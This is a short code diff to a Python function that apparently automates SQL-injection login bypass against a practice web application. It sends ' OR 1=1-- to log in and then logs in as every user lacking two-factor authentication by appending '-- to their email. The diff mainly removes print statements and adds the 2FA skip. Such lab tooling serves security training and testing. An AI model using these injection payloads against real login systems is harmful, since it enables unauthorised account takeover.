@@ -68,12 +68,11 @@ def login_all_users_with_sqli(server):
     """
     session = get_session(server, "' OR 1=1--", "anything")
     users = get_users(server, session)
-    print('Logging in with all available user accounts using SQLi...')
     for user in users:
-        email = "{}'--".format(user.get('email'))
-        print("login_all_users_with_sqli: Trying login as {}".format(email))
-        login = get_session(server, email, 'anything')
-        del login
+        if user['totpSecret'] == '': # TODO: Automate Two Factor Authentication
+            email = "{}'--".format(user.get('email'))
+            login = get_session(server, email, 'anything')
+            del login
     print('Success.')
 
 
